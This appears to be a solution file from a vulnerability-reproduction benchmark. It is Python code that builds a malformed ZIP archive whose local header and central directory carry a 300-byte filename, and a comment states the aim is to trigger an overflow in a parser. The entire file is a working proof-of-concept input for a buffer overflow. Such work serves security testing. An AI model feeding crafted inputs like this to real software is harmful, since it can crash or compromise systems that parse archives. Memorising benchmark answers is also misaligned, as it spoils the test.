import struct


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Filename longer than 256 bytes to trigger overflow
        name_len = 300
        filename = b"A" * name_len

        # Local file header
        local = bytearray()
        local += struct.pack("<I", 0x04034B50)  # Local file header signature
        local += struct.pack(
            "<HHHHHIIIHH",
            20,        # Version needed to extract
            0,         # General purpose bit flag
            0,         # Compression method (store)
            0,         # Last mod file time
            0,         # Last mod file date
            0,         # CRC-32
            0,         # Compressed size
            0,         # Uncompressed size
            name_len,  # File name length
            0,         # Extra field length
        )
        local += filename  # File name
        # No extra field, no file data

        offset_central = len(local)  # Central directory starts after local header

        # Central directory file header
        central = bytearray()
        central += struct.pack("<I", 0x02014B50)  # Central dir file header signature
        central += struct.pack(
            "<HHHHHHIIIHHHHHII",
            20,        # Version made by
            20,        # Version needed to extract
            0,         # General purpose bit flag
            0,         # Compression method
            0,         # Last mod file time
            0,         # Last mod file date
            0,         # CRC-32
            0,         # Compressed size
            0,         # Uncompressed size
            name_len,  # File name length
            0,         # Extra field length
            0,         # File comment length
            0,         # Disk number start
            0,         # Internal file attributes
            0,         # External file attributes
            0,         # Relative offset of local header (0, at file start)
        )
        central += filename  # File name
        # No extra field, no file comment

        central_size = len(central)

        # End of central directory record
        eocd = struct.pack(
            "<IHHHHIIH",
            0x06054B50,   # End of central dir signature
            0,            # Number of this disk
            0,            # Disk where central directory starts
            1,            # Number of central directory records on this disk
            1,            # Total number of central directory records
            central_size, # Size of central directory
            offset_central,  # Offset of start of central directory
            0,            # ZIP file comment length
        )

        return bytes(local) + bytes(central) + eocd